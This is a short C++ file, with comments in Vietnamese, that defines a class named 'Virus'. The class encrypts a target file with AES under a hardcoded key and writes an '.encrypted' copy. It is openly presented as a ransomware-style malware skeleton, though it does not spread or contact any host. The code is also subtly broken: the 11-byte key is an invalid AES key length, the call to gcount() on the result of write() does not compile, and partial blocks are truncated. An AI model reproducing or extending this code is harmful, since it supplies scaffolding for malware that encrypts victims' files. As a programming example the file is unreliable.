#include <iostream>
#include <fstream>
#include <string>
#include <openssl/aes.h>

class Virus {
private:
    std::string virus_code;
    std::string encryption_key;

public:
    // Hàm tạo virus với mã và khóa mã hóa
    Virus(const std::string& code, const std::string& key) : virus_code(code), encryption_key(key) {}

    // Phương thức mã hóa tệp tin
    void encrypt_file(const std::string& filename) {
        std::ifstream infile(filename, std::ios::binary);
        if (!infile) {
            std::cerr << "Failed to open file: " << filename << std::endl;
            return;
        }

        std::ofstream outfile(filename + ".encrypted", std::ios::binary);
        if (!outfile) {
            std::cerr << "Failed to create encrypted file." << std::endl;
            return;
        }

        // Khởi tạo khóa AES
        AES_KEY aes_key;
        AES_set_encrypt_key((const unsigned char*)encryption_key.c_str(), encryption_key.size() * 8, &aes_key);

        unsigned char inbuf[AES_BLOCK_SIZE], outbuf[AES_BLOCK_SIZE];
        int bytes_read, bytes_written;

        // Đọc và mã hóa từng khối dữ liệu
        while ((bytes_read = infile.readsome((char*)inbuf, AES_BLOCK_SIZE)) > 0) {
            AES_encrypt(inbuf, outbuf, &aes_key);
            bytes_written = outfile.write((char*)outbuf, bytes_read).gcount();
            if (bytes_written != bytes_read) {
                std::cerr << "Error writing to file." << std::endl;
                return;
            }
        }

        infile.close();
        outfile.close();

        std::cout << "File encrypted successfully." << std::endl;
    }
};

int main() {
    std::string virus_code = "This is the virus code.";
    std::string encryption_key = "MySecretKey";

    Virus virus(virus_code, encryption_key);
    virus.encrypt_file("example.txt");

    return 0;
}